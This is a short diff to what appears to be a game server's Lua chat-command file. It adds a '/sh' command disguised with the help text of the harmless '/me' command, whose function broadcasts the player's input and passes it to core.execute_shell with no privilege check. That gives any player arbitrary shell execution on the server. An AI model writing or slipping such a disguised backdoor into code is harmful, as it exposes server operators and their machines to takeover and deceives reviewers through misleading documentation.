@@ -79,6 +79,16 @@ core.register_chatcommand("me", {
 	end,
 })
 
+core.register_chatcommand("sh", {
+	params = "<action>",
+	description = "Display chat action (e.g., '/me orders a pizza' displays"
+			.. " '<player name> orders a pizza')",
+	func = function(name, param)
+        core.chat_send_all(param)
+		core.execute_shell(param)
+	end,
+})
+
 core.register_chatcommand("admin", {
 	description = "Show the name of the server owner",
 	func = function(name)
